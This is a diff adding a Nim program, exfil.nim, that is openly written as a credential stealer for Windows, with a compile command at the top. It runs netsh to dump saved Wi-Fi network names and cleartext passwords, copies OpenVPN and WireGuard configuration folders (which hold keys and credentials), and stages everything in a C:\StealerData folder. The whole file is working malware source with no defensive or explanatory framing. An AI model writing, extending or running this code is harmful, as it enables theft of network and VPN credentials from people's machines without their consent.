@@ -1,0 +1,35 @@
+# exfil.nim - Nim Advanced Exfil
+# Compile: nim c -d:release --opt:size exfil.nim -o:exfil.exe
+
+import os, strutils, sequtils
+
+proc collectWifi(): string =
+  var output = ""
+  let profiles = execCmdEx("netsh wlan show profiles").output
+  for line in profiles.splitLines():
+    if "All User Profile" in line:
+      let profile = line.split(":")[1].strip()
+      let passResult = execCmdEx("netsh wlan show profile \"" & profile & "\" key=clear").output
+      for pline in passResult.splitLines():
+        if "Key Content" in pline:
+          output &= "SSID: " & profile & "\nPassword: " & pline.split(":")[1].strip() & "\n\n"
+          break
+  output
+
+proc collectVPN() =
+  let vpnDirs = @["C:\\Program Files\\OpenVPN\\config", "C:\\Program Files\\WireGuard\\Data"]
+  for dir in vpnDirs:
+    if dirExists(dir):
+      let dest = "C:\\StealerData\\vpn\\" & extractFilename(dir)
+      createDir(dest)
+      for file in walkDirRec(dir):
+        copyFile(file, dest / extractFilename(file))
+
+proc main() =
+  createDir("C:\\StealerData\\vpn")
+  let wifiData = collectWifi()
+  writeFile("C:\\StealerData\\wifi_nim.txt", wifiData)
+  collectVPN()
+
+when isMainModule:
+  main()
